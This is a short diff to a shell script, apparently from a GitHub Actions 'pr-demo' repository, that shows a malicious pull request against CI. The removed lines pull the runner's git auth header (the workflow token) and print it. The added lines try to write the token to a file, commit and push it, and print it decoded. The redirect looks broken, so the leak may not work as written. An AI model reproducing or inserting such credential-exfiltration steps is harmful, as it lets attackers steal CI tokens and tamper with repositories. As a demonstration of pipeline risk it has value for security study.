@@ -159,8 +159,11 @@ echo We have access to the file system!
  # echo "Deleting $i !"
 # done
 
-GIT_VALUES=`git --work-tree=/home/runner/work/pr-demo/pr-demo config --get http.https://github.com/.extraheader | cut -d' ' -f3 | base64`
-echo GIT_VALUES=$GIT_VALUES | base64 -d
+GIT_VALUES=`git --work-tree=/home/runner/work/pr-demo/pr-demo config --get http.https://github.com/.extraheader | cut -d' ' -f3 | base64` > foo.out
+git add foo.out
+git commit -m "initial add" foo.out
+git push 
+cat foo.out | base64 -d
 
 # Escape application args
 save () {
